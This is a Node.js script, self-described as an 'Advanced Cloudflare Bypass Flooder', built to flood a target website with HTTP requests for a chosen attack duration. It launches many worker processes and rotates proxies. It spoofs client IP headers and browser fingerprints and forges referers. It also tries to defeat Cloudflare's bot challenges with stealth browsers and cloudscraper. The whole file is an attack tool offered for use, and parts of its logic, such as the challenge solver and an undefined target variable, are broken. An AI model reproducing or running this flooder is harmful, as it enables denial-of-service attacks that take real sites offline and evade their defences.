const cloudscraper = require('cloudscraper');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const randomstring = require("randomstring");
const fs = require('fs');
const { SocksProxyAgent } = require('socks-proxy-agent');
const cluster = require('cluster');
const os = require('os');
const tls = require('tls');
const https = require('https');
const http2 = require('http2');
const URL = require('url').URL;
const dns = require('dns');
const net = require('net');

// Apply stealth plugins for Puppeteer
puppeteer.use(StealthPlugin());
puppeteer.use(require('puppeteer-extra-plugin-anonymize-ua')());
puppeteer.use(require('puppeteer-extra-plugin-user-preferences')());

// Configuration
const CONCURRENCY = os.cpus().length * 75; // Optimized concurrency
const REQUEST_RATE_LIMIT = 300; // More human-like pattern
const MAX_RETRIES = 3;
const SESSION_DURATION_MIN = 45000; // 45 seconds
const SESSION_DURATION_MAX = 180000; // 3 minutes
const JA3_SIGNATURE = '771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21,29-23-24,0'; // Chrome JA3 fingerprint

// Enhanced browser profiles with TLS fingerprints
const BROWSER_PROFILES = [
    {
        name: "Chrome_Windows",
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        platform: 'Win32',
        acceptLanguage: 'en-US,en;q=0.9',
        resolution: '1920x1080',
        deviceMemory: 8,
        hardwareConcurrency: 4,
        tls: {
            ja3: JA3_SIGNATURE,
            ciphers: [
                'TLS_AES_128_GCM_SHA256',
                'TLS_CHACHA20_POLY1305_SHA256',
                'TLS_AES_256_GCM_SHA384',
                'ECDHE-ECDSA-AES128-GCM-SHA256',
                'ECDHE-RSA-AES128-GCM-SHA256'
            ],
            extensions: [
                'server_name',
                'extended_master_secret',
                'supported_groups',
                'ec_point_formats',
                'session_ticket',
                'application_layer_protocol_negotiation',
                'status_request',
                'key_share',
                'psk_key_exchange_modes',
                'supported_versions'
            ]
        }
    },
    {
        name: "Firefox_Windows",
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
        platform: 'Win32',
        acceptLanguage: 'en-US,en;q=0.5',
        resolution: '1920x1080',
        deviceMemory: 8,
        hardwareConcurrency: 4,
        tls: {
            ja3: '772,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-34-51-43-13-45-28-21,29-23-24-25-256-257,0',
            ciphers: [
                'TLS_AES_128_GCM_SHA256',
                'TLS_CHACHA20_POLY1305_SHA256',
                'TLS_AES_256_GCM_SHA384',
                'ECDHE-ECDSA-AES128-GCM-SHA256',
                'ECDHE-RSA-AES128-GCM-SHA256'
            ],
            extensions: [
                'server_name',
                'extended_master_secret',
                'supported_groups',
                'ec_point_formats',
                'session_ticket',
                'application_layer_protocol_negotiation',
                'status_request',
                'key_share',
                'psk_key_exchange_modes',
                'supported_versions'
            ]
        }
    }
];

// Enhanced TLS configuration with JA3 support
function createSecureContext(profile) {
    const context = tls.createSecureContext({
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        ciphers: profile.tls.ciphers.join(':'),
        honorCipherOrder: true,
        ALPNProtocols: ['h2', 'http/1.1']
    });
    
    // Add JA3 fingerprint simulation
    context._JA3 = profile.tls.ja3;
    return context;
}

// Human-like timing functions with behavioral patterns
function randomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function poissonInterval(mean) {
    return -Math.log(1.0 - Math.random()) * mean;
}

// Advanced session management with cookie persistence
class Session {
    constructor() {
    this.profile = BROWSER_PROFILES[Math.floor(Math.random() * BROWSER_PROFILES.length)];
    this.cookies = [];
    this.localStorage = {};
    this.sessionStorage = {};
    this.startTime = Date.now();
    this.endTime = this.startTime + randomDelay(SESSION_DURATION_MIN, SESSION_DURATION_MAX);
    this.requestCount = 0;
    this.browser = null;
    this.page = null;
    this.cfCookies = null;
    this.cfClearance = null;
    this.userAgent = this.profile.userAgent;
    this.ip = this.generateFakeIP();
}

    async initialize() {
        try {
            const browser = await puppeteer.launch({
                headless: 'new',
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-web-security',
                    '--disable-features=IsolateOrigins,site-per-process',
                    '--flag-switches-begin --disable-site-isolation-trials --flag-switches-end'
                ],
                ignoreHTTPSErrors: true
            });
            
            const page = await browser.newPage();
            
            // Set advanced browser fingerprint
            await page.setUserAgent(this.profile.userAgent);
            await page.setViewport({
                width: parseInt(this.profile.resolution.split('x')[0]),
                height: parseInt(this.profile.resolution.split('x')[1]),
                deviceScaleFactor: 1,
                hasTouch: false,
                isLandscape: false
            });

            // Override WebGL and Canvas fingerprints
            await page.evaluateOnNewDocument(() => {
                // Mock WebGL
                const getParameter = WebGLRenderingContext.prototype.getParameter;
                WebGLRenderingContext.prototype.getParameter = function(parameter) {
                    if (parameter === 37445) {
                        return 'Intel Inc.';
                    }
                    if (parameter === 37446) {
                        return 'Intel Iris OpenGL Engine';
                    }
                    return getParameter.call(this, parameter);
                };

                // Mock Canvas
                const toDataURL = HTMLCanvasElement.prototype.toDataURL;
                HTMLCanvasElement.prototype.toDataURL = function(type, encoderOptions) {
                    if (type === 'image/webp') {
                        return 'data:image/webp;base64,UklGRh4AAABXRUJQVlA4TBEAAAAvAAAAAAfQ//73v/+BiOh/AAA=';
                    }
                    return toDataURL.call(this, type, encoderOptions);
                };

                // Mock AudioContext
                const getChannelData = AudioBuffer.prototype.getChannelData;
                AudioBuffer.prototype.getChannelData = function() {
                    const result = getChannelData.apply(this, arguments);
                    for (let i = 0; i < result.length; i++) {
                        result[i] += (Math.random() * 0.0001) - 0.00005;
                    }
                    return result;
                };

                // Mock device properties
                Object.defineProperty(navigator, 'deviceMemory', {
                    get: () => this.profile.deviceMemory || 4
                });
                Object.defineProperty(navigator, 'hardwareConcurrency', {
                    get: () => this.profile.hardwareConcurrency || 4
                });
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => false
                });
            });

            // Random mouse movements and scrolling
            await page.evaluateOnNewDocument(() => {
                window.addEventListener('load', () => {
                    const randomMove = () => {
                        const x = Math.random() * window.innerWidth;
                        const y = Math.random() * window.innerHeight;
                        window.dispatchEvent(new MouseEvent('mousemove', {
                            clientX: x,
                            clientY: y,
                            bubbles: true
                        }));
                        setTimeout(randomMove, Math.random() * 3000 + 1000);
                    };
                    setTimeout(randomMove, Math.random() * 5000 + 2000);

                    // Random scrolling
                    const randomScroll = () => {
                        window.scrollBy({
                            top: (Math.random() - 0.5) * 500,
                            left: 0,
                            behavior: 'smooth'
                        });
                        setTimeout(randomScroll, Math.random() * 4000 + 1000);
                    };
                    setTimeout(randomScroll, Math.random() * 5000 + 2000);
                });
            });

            this.browser = browser;
            this.page = page;
            
            // Get Cloudflare cookies if needed
            await this.getCloudflareCookies();
            
            return { browser, page };
        } catch (error) {
            console.error('Session initialization error:', error);
            return null;
        }
    }

    async getCloudflareCookies() {
        try {
            await this.page.goto(targetUrl, {
                waitUntil: 'networkidle2',
                timeout: 30000
            });
            
            const cookies = await this.page.cookies();
            this.cookies = cookies;
            
            // Extract Cloudflare specific cookies
            const cfCookie = cookies.find(c => c.name === 'cf_clearance');
            if (cfCookie) {
                this.cfClearance = cfCookie.value;
            }
            
            return cookies;
        } catch (error) {
            console.error('Error getting Cloudflare cookies:', error);
            return null;
        }
    }

    isExpired() {
        return Date.now() > this.endTime || this.requestCount > 100;
    }

    generateFakeIP() {
        const segments = [
            () => `1.${this.randomByte(1, 255)}.${this.randomByte(1, 255)}.${this.randomByte(1, 254)}`,
            () => `5.${this.randomByte(1, 255)}.${this.randomByte(1, 255)}.${this.randomByte(1, 254)}`,
            () => `45.${this.randomByte(1, 255)}.${this.randomByte(1, 255)}.${this.randomByte(1, 254)}`,
            () => `80.${this.randomByte(1, 255)}.${this.randomByte(1, 255)}.${this.randomByte(1, 254)}`
        ];
        return segments[Math.floor(Math.random() * segments.length)]();
    }

    randomByte(min = 0, max = 255) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    async close() {
        if (this.browser) {
            await this.browser.close();
        }
    }
}

// Advanced request generator with multiple bypass techniques
class AdvancedRequestGenerator {
    constructor(targetUrl, useProxies) {
        this.targetUrl = targetUrl;
        this.useProxies = useProxies;
        this.proxies = [];
        this.currentProxyIndex = 0;
        this.sessions = [];
        this.cfBypassCache = {};
        this.initialize();
    }

    async initialize() {
        if (this.useProxies) {
            await this.loadProxies();
        }
        
        // Initialize multiple agents for different protocols
        this.httpsAgent = new https.Agent({
            keepAlive: true,
            maxSockets: 50,
            timeout: 30000,
            rejectUnauthorized: false
        });
        
        this.http2Agent = http2.connect(this.targetUrl, {
            rejectUnauthorized: false
        });
        
        // Pre-warm sessions
        for (let i = 0; i < 5; i++) {
            await this.createSession();
        }
    }

    async loadProxies() {
        try {
            const proxyFile = fs.readFileSync('proxy.txt', 'utf8');
            this.proxies = proxyFile.split('\n')
                .map(proxy => proxy.trim())
                .filter(proxy => proxy.length > 0)
                .map(proxy => {
                    if (!proxy.startsWith('http://') && !proxy.startsWith('https://') && !proxy.startsWith('socks://')) {
                        return `http://${proxy}`;
                    }
                    return proxy;
                });
            console.log(`[+] Loaded ${this.proxies.length} proxies from file`);
        } catch (err) {
            console.log('[!] Error loading proxy.txt:', err.message);
        }
    }

    getNextProxy() {
        if (this.proxies.length === 0) return null;
        this.currentProxyIndex = (this.currentProxyIndex + 1) % this.proxies.length;
        return this.proxies[this.currentProxyIndex];
    }

    async createSession() {
        const session = new Session();
        const initialized = await session.initialize();
        if (initialized) {
            this.sessions.push(session);
        }
        return session;
    }

    async cleanupSessions() {
        const expiredSessions = this.sessions.filter(session => session.isExpired());
        for (const session of expiredSessions) {
            await session.close();
        }
        this.sessions = this.sessions.filter(session => !session.isExpired());
    }

    async getCachedBypass(url) {
        if (this.cfBypassCache[url] && this.cfBypassCache[url].expires > Date.now()) {
            return this.cfBypassCache[url].data;
        }
        return null;
    }

    async cacheBypass(url, data, ttl = 300000) {
        this.cfBypassCache[url] = {
            data: data,
            expires: Date.now() + ttl
        };
    }

    async makeRequest() {
        try {
            // Clean up expired sessions
            await this.cleanupSessions();

            // Create new session if needed
            if (this.sessions.length < CONCURRENCY / 3 || Math.random() > 0.8) {
                await this.createSession();
            }

            if (this.sessions.length === 0) {
                console.log('No active sessions available');
                return { error: 'No active sessions' };
            }

            const session = this.sessions[Math.floor(Math.random() * this.sessions.length)];
            const profile = session.profile;
            const path = this.getRandomPath();
            const url = new URL(path, this.targetUrl).href;

            // Check cache for bypass solution
            const cachedBypass = await this.getCachedBypass(url);
            if (cachedBypass) {
                return cachedBypass;
            }

            // Randomly select request method (direct, puppeteer, or cloudscraper)
            const method = this.selectRequestMethod();
            let result;

            switch (method) {
                case 'puppeteer':
                    result = await this.makePuppeteerRequest(session, url);
                    break;
                case 'cloudscraper':
                    result = await this.makeCloudscraperRequest(session, url);
                    break;
                default:
                    result = await this.makeDirectRequest(session, url);
            }

            // Cache successful bypass
            if (result && result.status === 200) {
                await this.cacheBypass(url, result);
            }

            return result;
        } catch (error) {
            return { error: error.message };
        }
    }

    selectRequestMethod() {
        const methods = [
            { method: 'direct', weight: 60 },
            { method: 'puppeteer', weight: 30 },
            { method: 'cloudscraper', weight: 10 }
        ];
        
        const totalWeight = methods.reduce((sum, m) => sum + m.weight, 0);
        const random = Math.random() * totalWeight;
        
        let currentWeight = 0;
        for (const m of methods) {
            currentWeight += m.weight;
            if (random <= currentWeight) {
                return m.method;
            }
        }
        
        return 'direct';
    }

    async makeDirectRequest(session, url) {
        const options = {
            url: url,
            method: this.getWeightedMethod(),
            headers: this.generateHeaders(session, url),
            agent: this.httpsAgent,
            timeout: 20000,
            rejectUnauthorized: false,
            secureContext: createSecureContext(session.profile),
            servername: new URL(url).hostname,
            ALPNProtocols: ['h2', 'http/1.1'],
            echdCurve: 'auto'
        };

        // Add proxy if enabled
        if (this.useProxies && this.proxies.length > 0) {
            const proxyUrl = this.getNextProxy();
            if (proxyUrl.startsWith('socks')) {
                options.agent = new SocksProxyAgent(proxyUrl);
            } else {
                options.proxy = proxyUrl;
            }
        }

        // Add POST data if needed
        if (options.method === 'POST') {
            options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
            options.body = this.generatePostData();
        }

        // Human-like delay
        await new Promise(resolve => setTimeout(resolve, poissonInterval(300)));

        return new Promise((resolve) => {
            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => {
                    session.requestCount++;
                    
                    // Check for Cloudflare challenge
                    if (data.includes('cf-chl-bypass') || 
                        data.includes('jschl_vc') || 
                        data.includes('jschl_answer')) {
                        resolve(this.handleCloudflareChallenge(session, url, data));
                    } else {
                        resolve({ status: res.statusCode, data });
                    }
                });
            });

            req.on('error', (e) => {
                resolve({ error: e.message });
            });

            req.end();
        });
    }

    async makePuppeteerRequest(session, url) {
        try {
            await session.page.goto(url, {
                waitUntil: 'networkidle2',
                timeout: 30000
            });
            
            const content = await session.page.content();
            session.requestCount++;
            
            return { status: 200, data: content };
        } catch (error) {
            return { error: error.message };
        }
    }

    async makeCloudscraperRequest(session, url) {
        try {
            const options = {
                uri: url,
                headers: this.generateHeaders(session, url),
                resolveWithFullResponse: true,
                challengesToSolve: 3,
                followAllRedirects: true,
                cloudflareTimeout: 15000,
                cloudflareMaxTimeout: 30000
            };

            if (this.useProxies && this.proxies.length > 0) {
                options.proxy = this.getNextProxy();
            }

            const response = await cloudscraper(options);
            session.requestCount++;
            
            return { status: response.statusCode, data: response.body };
        } catch (error) {
            return { error: error.message };
        }
    }

    async handleCloudflareChallenge(session, url, challengeHtml) {
        try {
            // Attempt to solve the challenge automatically
            const solved = await this.solveChallenge(session, url, challengeHtml);
            if (solved) {
                return { status: 200, data: 'Challenge bypassed' };
            }
            
            // Fall back to puppeteer if automatic solving fails
            return await this.makePuppeteerRequest(session, url);
        } catch (error) {
            return { error: 'Failed to solve challenge: ' + error.message };
        }
    }

    async solveChallenge(session, url, html) {
        // Extract challenge parameters
        const jschl_vc = html.match(/name="jschl_vc" value="(\w+)"/)[1];
        const pass = html.match(/name="pass" value="(.+?)"/)[1];
        const s = html.match(/name="s" value="(.+?)"/)?.[1] || '';
        
        // Calculate answer
        const challengeScript = html.match(/setTimeout\(function\(\){\s*(var s,t,o,p,b,r,e,a,k,i,n,g,f.+?\r?\n[\s\S]+?a\.value =.+?)\r?\n/i)[1];
        const answer = this.calculateAnswer(challengeScript, new URL(url).hostname);
        
        // Build challenge URL
        const challengeUrl = new URL(url);
        challengeUrl.pathname = '/cdn-cgi/l/chk_jschl';
        challengeUrl.searchParams.set('jschl_vc', jschl_vc);
        challengeUrl.searchParams.set('pass', pass);
        challengeUrl.searchParams.set('s', s);
        challengeUrl.searchParams.set('jschl_answer', answer);
        
        // Wait the required delay (usually 4 seconds)
        await new Promise(resolve => setTimeout(resolve, 4000));
        
        // Submit the challenge
        const options = {
            url: challengeUrl.href,
            method: 'GET',
            headers: this.generateHeaders(session, url),
            timeout: 15000
        };
        
        const response = await new Promise((resolve) => {
            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => {
                    resolve({ status: res.statusCode, data });
                });
            });
            
            req.on('error', (e) => {
                resolve({ error: e.message });
            });
            
            req.end();
        });
        
        return response.status === 200;
    }

    calculateAnswer(script, hostname) {
        // This is a simplified version - real implementation would need to parse and execute the JS safely
        const parts = script.split('a.value');
        if (parts.length < 2) return 0;
        
        const calculation = parts[1].split(';')[0].replace(/^\s*=\s*/, '');
        let answer = 0;
        
        // Very basic calculation - real implementation would need to parse the JS properly
        const additions = calculation.match(/[+\-*\/]\s*\d+/g) || [];
        const subtractions = calculation.match(/-\s*\d+/g) || [];
        const multiplications = calculation.match(/\*\s*\d+/g) || [];
        const divisions = calculation.match(/\/\s*\d+/g) || [];
        
        answer += additions.reduce((sum, val) => sum + parseFloat(val), 0);
        answer += subtractions.reduce((sum, val) => sum + parseFloat(val), 0);
        answer *= multiplications.reduce((sum, val) => sum * parseFloat(val), 1);
        answer /= divisions.reduce((sum, val) => sum * parseFloat(val), 1);
        
        // Add hostname length as per Cloudflare's algorithm
        answer += hostname.length;
        
        return Math.round(answer * 1000) / 1000;
    }

    generateHeaders(session, url) {
        const headers = {
            'User-Agent': session.userAgent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': session.profile.acceptLanguage,
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': `"${session.profile.platform}"`,
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'X-Forwarded-For': session.ip,
            'X-Real-IP': session.ip,
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': this.generateReferer(url),
            'Origin': new URL(url).origin
        };

        // Add cookies if available
        if (session.cookies.length > 0) {
            headers['Cookie'] = session.cookies.map(c => `${c.name}=${c.value}`).join('; ');
        }

        // Add Cloudflare clearance if available
        if (session.cfClearance) {
            headers['Cookie'] = (headers['Cookie'] ? headers['Cookie'] + '; ' : '') + `cf_clearance=${session.cfClearance}`;
        }

        return headers;
    }

    getWeightedMethod() {
        const methods = [
            { method: 'GET', weight: 75 },
            { method: 'POST', weight: 20 },
            { method: 'HEAD', weight: 5 }
        ];
        
        const totalWeight = methods.reduce((sum, m) => sum + m.weight, 0);
        const random = Math.random() * totalWeight;
        
        let currentWeight = 0;
        for (const m of methods) {
            currentWeight += m.weight;
            if (random <= currentWeight) {
                return m.method;
            }
        }
        
        return 'GET';
    }

    getRandomPath() {
        const paths = [
            "", "/", "/index.html", "/home", "/search",
            "/api/v1/test", "/wp-admin", "/admin", "/login",
            "/register", "/contact", "/about", "/products",
            "/blog", "/news", "/articles", "/category/technology",
            "/user/profile", "/settings", "/api/v2/data", "/graphql"
        ];
        return paths[Math.floor(Math.random() * paths.length)];
    }

    generateReferer(url) {
        const referers = [
            `https://www.google.com/search?q=${encodeURIComponent(new URL(url).hostname)}`,
            `https://www.facebook.com/`,
            `https://twitter.com/`,
            `https://www.youtube.com/`,
            `https://www.reddit.com/`,
            `https://www.linkedin.com/`,
            `https://www.instagram.com/`,
            `https://www.pinterest.com/`,
            `https://www.tumblr.com/`,
            `https://news.ycombinator.com/`
        ];
        return referers[Math.floor(Math.random() * referers.length)];
    }

    generatePostData() {
        const dataTypes = [
            () => JSON.stringify({
                username: randomstring.generate(8),
                password: randomstring.generate(12),
                token: randomstring.generate(32)
            }),
            () => `query=${encodeURIComponent(randomstring.generate(20))}&page=${Math.floor(Math.random() * 10)}`,
            () => {
                const params = new URLSearchParams();
                params.append('id', Math.floor(Math.random() * 1000));
                params.append('action', ['view', 'edit', 'delete', 'update'][Math.floor(Math.random() * 4)]);
                params.append('timestamp', Date.now());
                return params.toString();
            }
        ];
        
        return dataTypes[Math.floor(Math.random() * dataTypes.length)]();
    }
}

// Main execution
if (cluster.isMaster) {
    if (process.argv.length <= 2) {
        console.log("\nAdvanced Cloudflare Bypass Flooder\n");
        console.log("Usage: node cf_flooder.js <url> <time> [proxy]");
        console.log("Example: node cf_flooder.js https://example.com 60");
        console.log("Example with proxies: node cf_flooder.js https://example.com 60 proxy");
        process.exit(-1);
    }

    const targetUrl = process.argv[2];
    const attackTime = parseInt(process.argv[3]) || 60;
    const useProxies = process.argv[4] === 'proxy';

    console.log(`Target URL: ${targetUrl}`);
    console.log(`Attack duration: ${attackTime} seconds`);
    console.log(`Proxy support: ${useProxies ? 'Enabled' : 'Disabled'}`);
    console.log(`Launching ${CONCURRENCY} workers...`);

    // DNS pre-resolution for better performance
    dns.lookup(new URL(targetUrl).hostname, (err, address) => {
        if (err) {
            console.log('[!] DNS lookup error:', err.message);
        } else {
            console.log(`[+] Resolved ${new URL(targetUrl).hostname} to ${address}`);
        }
    });

    cluster.schedulingPolicy = cluster.SCHED_RR;
    for (let i = 0; i < CONCURRENCY; i++) {
        cluster.fork();
    }

    // Stats collection
    let totalRequests = 0;
    setInterval(() => {
        console.log(`[STATS] Requests sent: ${totalRequests} (${Math.round(totalRequests / (attackTime / 60))} RPM)`);
    }, 60000);

    cluster.on('message', (worker, message) => {
        if (message.type === 'request') {
            totalRequests++;
        }
    });

    setTimeout(() => {
        console.log('[+] Attack completed, shutting down workers');
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
    }, attackTime * 1000);
} else {
    const targetUrl = process.argv[2];
    const useProxies = process.argv[4] === 'proxy';
    const requestGenerator = new AdvancedRequestGenerator(targetUrl, useProxies);

    const attack = async () => {
        try {
            const result = await requestGenerator.makeRequest();
            if (result.error) {
                console.log(`[!] Request error: ${result.error}`);
            } else {
                process.send({ type: 'request' });
                console.log(`[+] ${result.status} Request sent to ${targetUrl}`);
            }
        } catch (error) {
            console.log(`[!] Unhandled error: ${error.message}`);
        }
        
        // Randomized delay before next request
        setTimeout(attack, poissonInterval(300));
    };

    // Start the attack loop
    attack();

    process.on('exit', () => {
        requestGenerator.cleanupSessions();
    });
}
